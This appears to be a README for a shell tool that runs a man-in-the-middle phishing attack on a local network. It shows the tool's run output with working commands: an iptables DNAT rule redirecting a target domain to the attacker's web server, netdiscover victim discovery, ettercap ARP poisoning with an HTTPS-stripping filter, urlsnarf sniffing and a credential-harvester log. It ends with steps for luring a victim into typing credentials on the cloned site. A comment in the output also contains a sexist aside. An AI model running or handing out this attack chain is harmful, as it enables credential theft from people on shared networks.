MITM ATTACK WITH WEBSITE PHISHING
----------

1) Clone the files phishing.ksh and https_strip.filter  
2) Edit the https_strip.filter file and change *secure.domain.fr* matching your needs (https links stripped to http for example)  
  
 - run **phishing.ksh**:  
  
```bash
----------------------------------------------
   --==MITM attack with website phishing==--   
----------------------------------------------

[+] Flushing ip forwarding
[+] Flushing iptables

#HERE SET THE NAME OF THE LOG DIR THAT WILL BE CREATED
Name of 'Session'? (name of the folder that will be created with all the log files): test

#CHOOSE YOUR INTERFACE UP
[+] Discovering interfaces
lo:     state  UNKNOWN
eth0:   state  DOWN
wlan0:  state  UP
Please enter your interface: wlan0

#IF YOU WANNA CHANGE YOUR MAC ADDRESS (http://www.macvendors.com/)
Do you wanna spoof MAC @ ? [yYnN]: n

#TYPE THE DOMAIN THAT WILL BE REDIRECTED TO YOUR WEBSITE
Which domain do you wish to redirect ?: secure.domain.fr

#ASSUMING 192.168.1.99 IS THE MITM MACHINE LOCAL IP WITH APACHE RUNNING
[+] Setting up DNAT iptables rule
iptables -t nat -A PREROUTING -p tcp --dport 80 -d secure.domain.fr -j DNAT --to-destination 192.168.1.99:8080

#IF YOU WANNA RUN SETOOLKIT ( choose options 1) Social-Engineering -> 2) Website Attack Vectors -> 3) Credential Harvester Attack Method )
[+] Setting up website phishing
Do you wanna run setoolkit ? [yYnN]: n

[+] Starting apache2 service

#RUN NETDISCOVER IN ORDER TO ARPING THE SUBNET
[+] Net discovering
Do you wanna netdiscovering ? [yYnN]: y
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 192.168.1.1     01:12:23:34:45:56      1      42  Gateway
 192.168.1.100   12:23:34:45:56:67      2      84  Apple Macbook Pro

-- Active scan completed, 1 Hosts found.


[+] Routing information
Table de routage IP du noyau
Destination     Passerelle      Genmask         Indic Metric Ref    Use Iface
0.0.0.0         192.168.1.1     0.0.0.0         UG    600    0        0 wlan0
192.168.1.0     0.0.0.0         255.255.255.0   U     600    0        0 wlan0

#CHOOSE THE VICTIM
Enter target1 ip: 192.168.1.11
#CHOOSE THE SECOND MACHINE (DEFAULT IS GATEWAY)
Enter target2 ip [press enter for default gateway 192.168.1.1]: 

#LAUNCHING ETTERCAP WITH THE HTTPS STRIP ETTERCAP FILTER (https_strip.ef)
[+] Running MITM attack...

#IF YOU NEED TO LEGITIMATE AN ARP REPLY (IF GATEWAY IS A PRETENTIOUS YOUNG MADAM)
/!\ Please check poisoning is OK by typing 'P', then 'chk_poison'
Command for protected gateway: 
dhcping -c 192.168.1.100 -h 12:23:34:45:56:67 -s 192.168.1.1 -r -v

#SNIFFING HTTP REQUESTS
[+] Starting GET/POST logging...
urlsnarf: listening on wlan0 [tcp port 80 or port 8080 or port 3128]

#TAILING PHISHING WEBSITE HARVESTER FILE
[+] Looking for credentials...

[+] IMPORTANT...
After the job please close this script and clean up properly by hitting 'qQ'
```
  
 - Go on your victim's machine, surf on your *http://domain.fr* web page containing the link *https://secure.domain.fr* stripped into *http://secure.domain.fr*.  
 - Click on the stripped link *http://secure.domain.fr*, you will be redirected on the phising website.  
 - Enter your credentials, check the xterm windows tailing the harvester credentials file, you should see the post request saved.
